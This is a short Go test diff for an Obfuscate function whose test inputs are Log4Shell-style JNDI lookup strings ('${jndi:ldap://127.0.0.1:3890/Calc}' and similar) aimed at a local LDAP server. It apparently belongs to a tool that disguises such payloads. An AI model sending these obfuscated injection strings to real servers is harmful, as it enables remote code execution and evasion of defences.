@@ -10,8 +10,9 @@ import (
 func TestObfuscate(t *testing.T) {
 	t.Run("common", func(t *testing.T) {
 		for _, testdata := range [...]string{
-			"${jndi:ldap://127.0.0.1:3890/calc.class}",
-			"${jndi:ldap://127.0.0.1:3890/notepad.class}",
+			"${jndi:ldap://127.0.0.1:3890/Calc}",
+			"${jndi:ldap://127.0.0.1:3890/Notepad}",
+			"${jndi:ldap://127.0.0.1:3890/Nop}",
 			"test",
 		} {
 			obfuscated := Obfuscate(testdata)
